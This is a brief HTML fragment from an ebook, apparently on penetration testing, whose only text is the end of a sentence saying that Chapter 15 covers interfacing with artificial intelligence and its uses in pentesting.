       <span class="koboSpan" id="kobo.646.1">
        Chapter 15
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.647.1">
     , we’ll explore the topic of interfacing with artificial intelligence and its applications
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.648.1">
      in pentesting.
     </span>
    </span>
   </p>
  </div>
 </body></html>